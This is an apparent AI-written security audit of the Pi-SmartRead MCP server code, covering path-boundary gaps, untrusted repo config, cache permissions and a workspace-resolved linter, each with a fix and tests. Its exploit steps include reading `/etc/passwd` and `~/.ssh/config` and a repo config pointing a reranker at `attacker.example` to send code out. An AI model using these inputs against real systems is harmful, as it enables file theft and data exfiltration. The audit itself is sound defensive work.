# Security & Boundary Review — Pi-SmartRead

**Scope:** `/Users/rhinesharar/Pi-SmartRead/Pi-SmartRead` (root `.ts` modules + MCP server entry points).
**Mode:** Read-only audit. No project/source files were modified. Only this report file was created.
**Method:** Static inspection of every tool entry point, path-resolution helper, MCP resource/prompt/tool handlers, shell/external-process call sites, URL/protocol routers, and cache/persistence layers. Findings cross-checked against the existing `audits/audit-security.md` (prior hardening pass) and `audit/scout-system-map.md`.

**Legend:** Severity = High / Medium / Low. "Status" indicates whether the prior `audit-security.md` hardening pass already addressed the class.

---

## Summary

The codebase already received a hardening pass (commit `7e2310d` "Security hardening") that closed the highest-severity items from the prior audit: `smartread://config` now redacts API keys, `read_files`/`search`/`deep_search`/`repo_map`/`find_symbol`/`git_notes_*` directory params are realpath-bounded to the workspace, `skill://` is symlink-hardened, git commit-ish is validated against option injection, and `EdgeStore.toProvenances` re-validates replayed paths via realpath. Embedding `baseUrl` is env-only (repo-file `baseUrl` is ignored).

This review found **5 concrete residual issues** that survive that hardening pass, plus 3 informational notes.

| # | Severity | Area | File | One-line |
|---|----------|------|------|----------|
| 1 | High | Filesystem path | `find-symbol-tool.ts` | `symbol_info` `path` param is not bounded to workspace → arbitrary file read |
| 2 | Medium | URL/protocol + config trust | `config.ts` | `externalReranker.baseUrl`/`apiKey` still fall back to untrusted repo-file values |
| 3 | Medium | Filesystem write boundary | `graph-mutate.ts`, `context-graph.ts` | `graph_mutate` `directory` resolves against `process.cwd()`, not `ctx.cwd`, and is not workspace-bounded → arbitrary-dir `.pi-smartread/` write |
| 4 | Low | Filesystem permissions | `cache.ts`, `persistent-embedding-cache.ts` | First-time cache dir + cache files created with default umask (not `0o700`/`0o600`) |
| 5 | Low | External process | `context-hygiene.ts` | `runLint` uses `npx tsc`/`python`/`go` resolved from the workspace (trojan-binary risk) — currently dead code |
| I-1 | Info | MCP prompts | `mcp-server.ts` | Prompt args interpolated into template strings; `filePath` not workspace-validated (no read, instructs model only) |
| I-2 | Info | Git boundary | `git-notes-tool.ts`, `git-history.ts` | `findGitRoot` walks above workspace; notes/log operate on the enclosing repo (may be a parent repo) |
| I-3 | Info | Config trust | `config.ts` | Experimental tool gating (`graphMutate`/`gitNotes`) is read from untrusted repo-file config |

---

## Issue 1 — `symbol_info` `path` param allows arbitrary file read (High)

**File/line:** `find-symbol-tool.ts`
- `handleOverview` line 379: `const fullPath = resolve(root, relativePath);` then line 380 `existsSync(fullPath)` and subsequent `fs.readFile(fullPath, ...)` / LSP `getDocumentSymbols(fullPath, root)`.
- `handleDeclaration` line 498: `const fullPath = resolve(root, relativePath);` → line 501 `fs.readFile(fullPath, ...)`.
- `handleImplementations` line 602: `const fullPath = resolve(root, relativePath);` → line 605 `fs.readFile(fullPath, ...)`.
- `handleReferences` line 469 / `handleImplementations` line 636 pass `relative(cwd, resolve(root, relativePath))` to `resolveSymbol`, which then reads files.

**Exploit/failure path:**
1. MCP/Pi caller invokes `symbol_info` with `action: "outline"`, `directory: "."` (passes the realpath workspace check in `resolveDirectory`), and `path: "/etc/passwd"` (or `~/.ssh/config`, or any absolute path).
2. `resolve(root, "/etc/passwd")` returns `/etc/passwd` unchanged because the second arg is absolute.
3. `existsSync("/etc/passwd")` is true → the file is read with `fs.readFile` and its content/symbol outline is returned to the caller.
4. The `directory` boundary check is bypassed entirely because `path` is never passed through `resolveWorkspacePath`/`isPathInside`.

This is the same class as prior finding #2/#3 but for the `path` (not `directory`) parameter, which was missed by the hardening pass. `find_symbol` (the other tool in this file) does **not** take a `path` param and is safe (it scans files produced by `expandToMonorepoRoots(root)`, which are bounded by `file-discovery`'s non-symlink-following walk).

**Minimal fix:** In every `symbol_info` action handler, validate the resolved file path stays inside the workspace before any read, e.g.:

```ts
// At the top of handleOverview / handleDeclaration / handleImplementations,
// after computing fullPath:
const fullPath = resolve(root, relativePath);
if (!isPathInside(root, fullPath)) {
  throw new Error(`Path outside workspace: ${relativePath}`);
}
```

Reuse `isPathInside` from `context-graph.ts` (already symlink-hardened). Apply the same guard to the `relativePath` branches in `handleReferences`/`handleImplementations` before they reach `resolveSymbol`.

**Tests to add (`test/unit/find-symbol-tool.test.ts`, currently absent):**
- `symbol_info action=outline path="/etc/passwd"` (or a tempdir outside workspace) → throws "outside workspace".
- `symbol_info action=outline path="../../../../etc/passwd"` → throws.
- `symbol_info action=declaration path=<outside> query="x"` → throws before any `fs.readFile`.
- Positive: `path` inside workspace still resolves.

---

## Issue 2 — `externalReranker` baseUrl/apiKey fall back to untrusted repo-file config (Medium)

**File/line:** `config.ts:324-330`
```ts
externalReranker: raw.externalReranker
  ? {
      ...raw.externalReranker,
      baseUrl: process.env.PI_SMARTREAD_RERANKER_BASE_URL ?? raw.externalReranker.baseUrl,
      apiKey: process.env.PI_SMARTREAD_RERANKER_API_KEY ?? raw.externalReranker.apiKey,
    }
  : undefined,
```
The preceding comment (lines 321-323) states "Only env vars supply the reranker baseUrl/apiKey," but the `??` operator falls back to `raw.externalReranker.baseUrl`/`apiKey` (loaded from `pi-smartread.config.json`, an untrusted repo file) when the env vars are unset. This contradicts the embedding-`baseUrl` treatment at lines 250-258, where repo-file `baseUrl` is correctly ignored.

**Exploit/failure path:**
1. A malicious repo commits `pi-smartread.config.json` with `"externalReranker": { "baseUrl": "https://attacker.example/v1", "model": "x" }`.
2. A user with no `PI_SMARTREAD_RERANKER_BASE_URL` env var runs a retrieval that enables the external reranker.
3. `validateEmbeddingConfig()` returns `externalReranker.baseUrl = "https://attacker.example/v1"`.
4. `rerankWithExternal` (`rerank.ts:188`) → `externalRerank` (`rerank.ts:87`) POSTs `{ query, documents }` (code snippets / file chunks) to `https://attacker.example/v1/rerank`.

**Current mitigation (why Medium, not High):** `rerankWithExternal`/`externalRerank` is **not currently invoked** anywhere in the runtime path (`grep` shows no callers in `intent-read.ts` or other tools — only `rerank.test.ts`). The exposure surface is dormant. However, the config plumbing is live: `mcp-resources.ts:63` exposes `externalRerankerConfigured: !!embedding.externalReranker` in `smartread://config`, and any future caller of `rerankWithExternal` would activate the exfiltration path.

**Minimal fix:** Mirror the embedding-`baseUrl` pattern — env-only for network endpoints:
```ts
externalReranker: raw.externalReranker
  ? {
      model: raw.externalReranker.model,            // non-network: OK from file
      timeoutMs: raw.externalReranker.timeoutMs,
      maxDocuments: raw.externalReranker.maxDocuments,
      baseUrl: process.env.PI_SMARTREAD_RERANKER_BASE_URL,  // env only
      apiKey: process.env.PI_SMARTREAD_RERANKER_API_KEY,   // env only
    }
  : undefined,
```
Then drop the entry if `baseUrl` is undefined. Add `validateUrl(...)` on the env value (already exists at `config.ts:215`).

**Tests to add (`test/unit/config.test.ts`):**
- Repo-file `externalReranker.baseUrl` is ignored when env unset → `validateEmbeddingConfig().externalReranker` is undefined (or has no `baseUrl`).
- Env `PI_SMARTREAD_RERANKER_BASE_URL` overrides file value.
- File-only `externalReranker.model`/`timeoutMs` are preserved.

---

## Issue 3 — `graph_mutate` `directory` not bounded to workspace; arbitrary-dir write (Medium)

**File/line:**
- `graph-mutate.ts:48-56` — `_ctx: unknown` is unused; `directory = input.directory ?? process.cwd(); resolvedRoot = isAbsolute(directory) ? directory : resolve(process.cwd(), directory);` then only `existsSync(resolvedRoot)` is checked. No `isPathInside(ctx.cwd, …)` and no use of `ctx.cwd`.
- `context-graph.ts:854-866` — `EdgeStore.append` does `mkdirSync(dir, { recursive: true })` (default umask) then `appendFileSync(logPath, line, "utf-8")` to `<resolvedRoot>/.pi-smartread/graph-mutations.jsonl`.

**Exploit/failure path:**
1. `graph_mutate` is enabled (see I-3: gating is repo-file controlled).
2. MCP caller invokes `graph_mutate` with `directory: "/usr/local/share"`, `from: "/usr/local/share/x"`, `to: "/usr/local/share/y"` (both inside the supplied root, so the `isPathInside` check at line 61 passes).
3. `EdgeStore.recordBreakage` writes `/usr/local/share/.pi-smartread/graph-mutations.jsonl`, creating the `.pi-smartread` directory there with default permissions.

The `from`/`to` are correctly bounded to `resolvedRoot` (line 61), so they cannot escape the chosen root — but the **root itself** is attacker-controlled and unconstrained relative to the actual workspace (`ctx.cwd`). This is a write-outside-workspace primitive (small append-only file under any existing, writable directory).

**Minimal fix:**
- Use the extension context cwd: change signature to accept `ctx: ExtensionContext` (the tool already receives it but types it `unknown`), and resolve `directory` against `ctx.cwd` with the same `resolveDirectoryParam(ctx.cwd, input.directory)` helper used by every other tool.
- Reject `resolvedRoot` unless `isPathInside(ctx.cwd, resolvedRoot)` (or equal to it).
- Create `.pi-smartread/` with `mode: 0o700` and the log file with `mode: 0o600` (see Issue 4).

**Tests to add (`test/unit/graph-mutate.test.ts`):**
- `directory` outside `ctx.cwd` → error, no file created.
- `directory: "/tmp"` (absolute, outside) → rejected.
- Valid `directory` inside workspace writes only under workspace.

---

## Issue 4 — Cache dirs/files created with default filesystem permissions (Low)

**File/line:**
- `cache.ts:97` — `await fs.mkdir(this.cacheDir, { recursive: true });` (no `mode`) on first creation. (`clearDiskCache` at line 260 correctly uses `mode: 0o700`, but the first-run path does not.)
- `cache.ts:132-136` — `writeVersionFile` writes with `fs.writeFile(versionFile, ..., "utf-8")` (no `mode: 0o600`).
- `cache.ts:223` — `fs.writeFile(filePath, JSON.stringify(entry), "utf-8")` for each tag-cache entry (no `mode`). These entries contain symbol names, file paths, and tag kinds.
- `persistent-embedding-cache.ts:47` — `mkdirSync(this.cacheDir, { recursive: true })` (no `mode`).
- `persistent-embedding-cache.ts:127` — `writeFileSync(this.getFilePath(key), JSON.stringify(entry), "utf-8")` (no `mode`). Entries contain embedding vectors + a content hash (the query/chunk text itself is not stored, only hashed into the filename — so sensitivity is lower here than the tag cache).
- `context-graph.ts:854-866` — `EdgeStore.append` `mkdirSync(dir, { recursive: true })` + `appendFileSync(logPath, line, "utf-8")` (no `mode`). The mutation log contains file paths and human-readable `context` strings.

**Exploit/failure path:** On a shared/multi-user host (or a CI runner with a permissive umask like `022`), the tag cache (`.pi-smartread.tags.cache/*.json`), version file, embedding cache, and graph-mutation log are created world-readable. Other local users can read symbol names, absolute file paths, graph relations, and embedding vectors — a confidentiality leak of source structure. The graph-mutation log is also appendable by any writer (no `0o600`), a tampering/integrity vector.

**Minimal fix:**
- `cache.ts:97`: `await fs.mkdir(this.cacheDir, { recursive: true, mode: 0o700 });`
- `cache.ts:132` and `cache.ts:223`: pass `{ mode: 0o600 }` as the 3rd arg (fs accepts an options object/string for `writeFile` — use the object form: `fs.writeFile(path, data, { encoding: "utf-8", mode: 0o600 })`).
- `persistent-embedding-cache.ts:47`: `mkdirSync(this.cacheDir, { recursive: true, mode: 0o700 })`; line 127: `writeFileSync(path, data, { encoding: "utf-8", mode: 0o600 })`.
- `context-graph.ts:859`: `mkdirSync(dir, { recursive: true, mode: 0o700 })`; line 865: `appendFileSync(logPath, line, { encoding: "utf-8", mode: 0o600 })` — note `appendFileSync` with `flag` default `"a"`; pass `flag: "a"` explicitly plus `mode: 0o600`.
- On read, optionally verify existing dirs/files are not world-writable before use and re-chmod if so.

**Tests to add:** Extend `test/unit/cache.test.ts` / `persistent-embedding-cache.test.ts` to assert created dir mode `0o700` and file mode `0o600` via `statSync(...).mode & 0o777` (skip on platforms where perms are no-ops, e.g. Windows).

---

## Issue 5 — `runLint` resolves linters from the workspace (trojan-binary risk); dead code (Low)

**File/line:** `context-hygiene.ts:512-557`. `runLint` builds `command = "npx"`, `args = ["tsc", "--noEmit", fullPath]` (and `python -m py_compile`, `go vet`). `execFileAsync(command, args, { cwd, timeout: 30000 })`. `fullPath` is passed as a bare arg (execFile, no shell — so shell metacharacters in the filename are not interpreted, and a leading `-` would be seen by tsc as an option, but `fullPath` comes from a mutation target inside the workspace, so low risk there).

**Exploit/failure path:**
1. A malicious repo ships `node_modules/.bin/tsc` (or a `tsc` package that `npx` resolves locally) that exfiltrates `fullPath` contents or pivots.
2. If `lintAfterMutation` (line 559) is ever wired into the `write`/`edit` tool_result hook (it is currently **not** called anywhere — `grep` shows zero callers), every edit would shell out to a workspace-resolved binary with the edited file's path.

**Current mitigation:** Dead code — `runLint`/`lintAfterMutation` have no callers in production. The risk is latent, not active.

**Minimal fix:**
- Do not use `npx` (which resolves from the workspace `node_modules/.bin` and may fetch from the network). Prefer an explicit, host-controlled path or skip linting if a trusted linter is not configured.
- Insert `--` before `fullPath` in each branch (`["tsc", "--noEmit", "--", fullPath]`, `["-m", "py_compile", "--", fullPath]` is invalid for py_compile — instead validate `fullPath` doesn't start with `-`).
- Reject `fullPath` not inside `cwd` before invoking.
- If linting is not intended to ship, delete `runLint`/`lintAfterMutation` to remove the external-process surface.

**Tests:** If kept, add a test that a `fullPath` starting with `-` is rejected and that `cwd`-external paths are rejected.

---

## Informational notes

### I-1 — MCP prompt args interpolated without workspace validation
`mcp-server.ts:144-204`. Prompt handlers interpolate `args.code`, `args.diff`, `args.filePath`, `args.query`, `args.task` directly into template-literal strings. These are **prompts** (text fed to the model), not file reads — the `architectural-analysis` `filePath` is only inserted into the instruction text; no `readFile` happens here. The model would subsequently use the bounded `read_files`/`read` tools to actually fetch the file, so there is no direct read bypass. The only concern is prompt-formatting breakage if an arg contains backticks. No fix required for security; if hardening is desired, validate `filePath` against the workspace and escape backticks.

### I-2 — `findGitRoot` walks above the workspace
`git-notes-tool.ts` and `git-history.ts` call `findGitRoot(startDir)` (`git rev-parse --show-toplevel`), which returns the nearest enclosing repo — potentially a parent repo above the workspace. `git_notes_*` and co-commit analysis then operate on that outer repo (reading/writing notes under `refs/notes/pi-smartread` in the parent). `startDir` is workspace-bounded, so this is by-design "operate on the repo the workspace lives in," but on hosts where the workspace is a subdirectory of a larger trusted repo, notes/co-commit data cross the workspace boundary upward. Low risk; document the behavior or restrict `gitRoot` to be `isPathInside(ctx.cwd, gitRoot)` if strict workspace confinement is desired.

### I-3 — Experimental tool gating read from untrusted repo config
`mcp-registry.ts:60-69` enables `graph_mutate` / `git_notes_*` based on `loadExperimentalConfig()` (`config.ts:143`), which reads `experimental.graphMutate` / `experimental.gitNotes` from the repo `pi-smartread.config.json`. A malicious repo can enable these experimental tools by committing config. Both tools have their own input validation (commit-ish validation, `isPathInside` for `graph_mutate` from/to), but enabling tools from untrusted config widens the attack surface. Consider gating experimental tools behind env vars or a user-level (not repo-level) config file.

---

## What is already handled well (confirmed during this review)

- **`smartread://config` resource** (`mcp-resources.ts:45-74`): API keys redacted to `apiKeyConfigured: true` booleans; external reranker exposed only as `externalRerankerConfigured: !!…`. (Prior finding #1 — fixed.)
- **`read_files`** (`read-many.ts:319`): direct file reads are **intentionally unrestricted** — `resolveExplicitFile(ctx.cwd, resolveReadPath(targetPath))` resolves paths but does not gate them to the workspace (permission is handled externally; `PI_SMARTREAD_ALLOWED_ROOT` scopes index/retrieval only). Internal-URL branch (`skill://`/`memory://`/`graph://`) bypasses disk; `file://` and unknown schemes throw rather than read.
- **`search`/`deep_search`/`repo_map`/`find_symbol`/`git_notes_*` `directory` params**: all use realpath-bounded `resolveDirParam`/`resolveSearchRoot`/`resolveDirectory`/`resolveSearchDirParam` (per-file copies of the same pattern). (Prior finding #3 — fixed.)
- **`skill://`** (`skill-protocol.ts:33-52`): lexical `startsWith` + `realpathSync` symlink check before `readFile`. (Prior finding #5 — fixed.)
- **`graph://file/<name>`** (`graph-protocol.ts` → `context-graph.ts:getFileNeighbours` → `getImportNeighbours`): `isPathInside(this.root, fullPath)` guards the `readFileSync`. Symlink-escape via the URL `name` segment does not reach an unbounded read.
- **Git commit-ish** (`git-notes.ts:22-35`, `58`, `74`): `isValidCommitIsh` rejects leading `-`, `--` inserted before the commit arg. (Prior finding #6 — fixed.)
- **`EdgeStore.toProvenances`** (`context-graph.ts:790-810`): realpath-validates both `from` and `to` against `realRoot` and skips events outside the root; replay is bounded by `EDGE_LOG_MAX_BYTES`/`EDGE_LOG_MAX_LINES` via `tailRead`. (Prior finding #7 — fixed.)
- **Embedding `baseUrl`** (`config.ts:250-258`): env-only; repo-file `baseUrl` ignored; `validateUrl` enforces HTTPS for public hosts (localhost/private IPs allowed for local models). (Prior finding #4 — fixed for embeddings.)
- **`isPathInside`** (`context-graph.ts:57-76`): realpath-first, lexical fallback only when realpath throws. (Prior finding #5 — fixed.)
- **`file-discovery.ts` walk** (lines 360-376): uses `readdir({ withFileTypes: true })` and checks `entry.isDirectory()`/`entry.isFile()` — symlinks report as symlink type and are **not** followed, so scanning cannot escape the workspace via symlinked dirs/files.
- **All git/external exec** (`git-context.ts`, `git-notes.ts`, `git-history.ts`, `context-hygiene.ts`): uses `execFile` with argument arrays; no `shell: true`, no `child_process.exec`/`execSync`. No shell injection surface.
- **Bash context guard** (`bash-context-guard.ts`): temp files written with `flag: "wx"` (exclusive) and `mode: 0o600`; `suggestShellCommands` produces static suggestion strings, never executes them.
- **MCP `CallToolRequestSchema`** (`mcp-server.ts:67-123`): validates args via `Value.Check(tool.parameters, args)` before execution; unknown tool → error; `ctx = toExtensionContext(SERVER_CWD)` so `ctx.cwd` is fixed at server start.

---

## Validation

```bash
# No staged files (working tree has WIP mods from prior commits, none staged)
git status --short           # M on 12 files + ?? audit/ tool-guidance.ts (pre-existing WIP, not from this audit)
git diff --cached --name-only # (empty)

# TypeScript clean
npx tsc --noEmit              # exit 0, zero errors

# Targeted regression tests for the security-relevant modules (all pass)
npx vitest run test/unit/git-notes.test.ts test/unit/config.test.ts \
  test/unit/mcp-server.test.ts test/unit/utils.test.ts
# → 4 files, 60 tests, all passed (53.78s)

# Confirming line-level evidence for each finding
grep -n "resolve(root, relativePath)" find-symbol-tool.ts   # 379, 498, 602 (Issue 1)
grep -n "raw.externalReranker.baseUrl" config.ts            # 327 (Issue 2)
grep -n "process.cwd()\|input.directory\|_ctx" graph-mutate.ts # 48,51,52 (Issue 3)
grep -n "mkdir\|writeFile" cache.ts                         # 97 (no mode), 132, 223 (Issue 4)
grep -n "mkdirSync\|writeFileSync" persistent-embedding-cache.ts # 47, 127 (Issue 4)
grep -n "npx\|execFileAsync" context-hygiene.ts             # 520-533 (Issue 5)
```

No project/source files were modified. The only file written is this report (`audit/security-boundary-review.md`).